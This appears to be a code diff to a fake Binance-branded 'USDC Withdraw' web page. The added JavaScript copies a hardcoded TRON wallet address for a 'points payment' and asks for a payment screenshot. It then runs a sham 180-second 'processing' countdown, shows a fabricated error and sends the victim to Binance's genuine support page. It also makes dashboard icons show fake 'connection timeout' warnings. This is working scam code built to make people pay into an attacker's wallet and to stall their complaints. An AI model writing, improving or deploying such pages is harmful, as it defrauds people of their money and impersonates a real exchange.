@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Binance Wallet-USDC Withdraw</title>
+  <title>Wallet Dashboard - USDC Withdraw Flow</title>
   <meta name="viewport" content="width=500,initial-scale=1">
   <style>
     body {
@@ -683,4 +683,79 @@
     };
 
     window.handleCopyAddress = function() {
-      navigat
+      navigator.clipboard.writeText('TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa');
+      pointsPaymentCopied = true;
+      showPointsPaymentModal();
+    };
+
+    window.showIHavePaidModal = function() {
+      modalStage = 'upload-proof';
+      showModal(`
+        <h2>Upload Payment Screenshot</h2>
+        <input type="file" id="screenshotInput" accept="image/*" style="margin-bottom:10px;">
+        <button onclick="submitProof()">Submit</button>
+      `);
+      document.getElementById('screenshotInput').addEventListener('change', function(e){
+        screenshotFile = e.target.files[0];
+      });
+    };
+
+    window.submitProof = function() {
+      if (!screenshotFile) {
+        showModal(`
+          <h2>Upload Payment Screenshot</h2>
+          <div class="error">Please upload your payment screenshot before submitting.</div>
+          <button onclick="showIHavePaidModal()">Back</button>
+        `);
+        return;
+      }
+      startCountdown();
+    };
+
+    function startCountdown() {
+      let seconds = 180;
+      showModal(`
+        <h2>Processing Payment</h2>
+        <div class="countdown">Time remaining: <span id="countdownSec">${seconds}</span> seconds</div>
+      `, false);
+      countdownTimer = setInterval(() => {
+        seconds--;
+        document.getElementById('countdownSec').innerText = seconds;
+        if (seconds <= 0) {
+          clearInterval(countdownTimer);
+          showSupportModal();
+        }
+      }, 1000);
+    }
+
+    function showSupportModal() {
+      showModal(`
+        <h2>Unexpected Error Occurred</h2>
+        <div class="error">For assistance regarding your transaction, please contact our professional support team.</div>
+        <button class="support-btn" onclick="redirectSupport()">
+          🆘 Contact Support
+        </button>
+      `);
+    }
+
+    window.redirectSupport = function() {
+      window.location.href = 'https://support.binance.com/en/contact';
+    };
+
+    // Intercept dashboard clicks for "connection timeout" error
+    function addTimeoutHandlers() {
+      document.querySelectorAll('.nav-bar-bottom .nav-icon.inactive, .qa-icon').forEach(el => {
+        el.onclick = function() {
+          showModal(`
+            <h2>Connection Timeout</h2>
+            <div class="error">Your session has timed out. Please use your Binance Wallet application to confirm your activity.<br>If you experience issues, contact support for assistance.</div>
+            <button onclick="closeModal()">Close</button>
+          `);
+        }
+      });
+    }
+    // Wait for DOM
+    window.addEventListener('DOMContentLoaded', addTimeoutHandlers);
+  </script>
+</body>
+</html>
